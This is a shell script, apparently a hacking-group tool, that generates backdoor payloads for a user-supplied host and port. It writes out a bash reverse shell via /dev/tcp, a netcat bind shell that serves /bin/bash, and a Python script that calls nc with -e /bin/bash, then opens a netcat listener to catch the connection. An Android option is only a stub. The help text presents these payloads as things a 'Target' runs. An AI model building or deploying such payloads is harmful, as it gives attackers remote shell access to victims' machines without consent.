#!/bin/sh
clear
palkon() {
 clear
 echo "\033[32m
  _/_/ _/_/_/ _/_/_/ _/_/_/     _/_/_/  _/_/_/ _/_/_/
   _/     _/     _/     _/     _/   _/ _/  _/   _/
  _/ _/_/_/ _/_/_/   _/_/_/   _/_/_/  _/_/_/   _/
 _/     _/     _/     _/     _/ _/   _/  _/   _/
_/ _/_/_/ _/_/_/     _/     _/   _/ _/  _/   _/\033[0m


\033[32m --[ \033[0mCreated By : \033[32m./Xi4u7
\033[32m---[ \033[0mFrom \033[32mAndroSec1337 Cyber Team
\033[32m --[ \033[0mSpecial Thanks To : \033[32mnullbyte\n\n\033[0m

  \033[32m[+]\033[0m   Info + Tutorial   \033[32m[+]

\033[32m[+] \033[0mBUG Tools :

- Kadang Console Gak Keluar Walaupun Target Udah RUN Payload :'(

\033[32m[+] \033[0mLIST PAYLOAD :

 python       : Generate Payload Using Python Script
 linux_netcat : Generate Netcat Backdoor Using Bash Script
 linux_bash   : Generate Payload Using bash Script
 android      : Generate apk file to backdoor

\033[32m[+]\033[0m DEMO :

 \033[32m./$0\033[0m linux_bash YourIP Port Output
 \033[32m./$0\033[0m linux_netcat YourIP Port Output
 \033[32m./$0\033[0m python YourIP Port Output
 \033[32m./$0\033[0m android YourIP Port Output


 "
}

if [ $1 = linux_bash ]
then
echo "
   \033[32m[~]\033[0m Your Host : \033[32m$2
   \033[32m[~]\033[0m Your Port : \033[32m$3
   \033[32m[~]\033[0m Output    : \033[32m$4"
echo "
\033[32m[+]\033[0m Generating Payload ..."
sleep 2
echo "#!/bin/bash
bash -i > /dev/tcp/$2/$3 0<&1 2>&1
" > $4
echo "\033[32m[+]\033[0m Generating Succses Full ..."
sleep 1
echo "\033[32m[+]\033[0m Listening On Port $3 ..."
sleep 1
nc -l -p $3

elif [ $1 = linux_netcat ]
then
echo "
   \033[32m[~]\033[0m Your Host : \033[32m$2
   \033[32m[~]\033[0m Your Port : \033[32m$3
   \033[32m[~]\033[0m Output    : \033[32m$4"
echo "
\033[32m[+]\033[0m Generating Payload ..."
sleep 2
echo "#!/bin/bash
nc -l -p $3 -e /bin/bash" > $4
echo "\033[32m[+]\033[0m Generating Succses Full ..."
sleep 1
echo "\033[32m[+]\033[0m Use \033[32;1mnc TargetIP YourPort\033[0m After Target Run Payload"
sleep 1

elif [ $1 = android ]
then
echo "\033[32m[+]\033[0m RAT For Android ?? Coming Soon.!!"

elif [ $1 = python ]
then
echo "
   \033[32m[~]\033[0m Your Host : \033[32m$2
   \033[32m[~]\033[0m Your Port : \033[32m$3
   \033[32m[~]\033[0m Output    : \033[32m$4"
echo "
\033[32m[+]\033[0m Generating Payload ..."
sleep 2
echo "#!/usr/bin/python
import os

os.system('nc $2 $3 -e /bin/bash')
" > $4
echo "\033[32m[+]\033[0m Generating Succses Full ..."
sleep 1
echo "\033[32m[+]\033[0m Listening On Port $3 ..."
nc -l -p $3

else
palkon
fi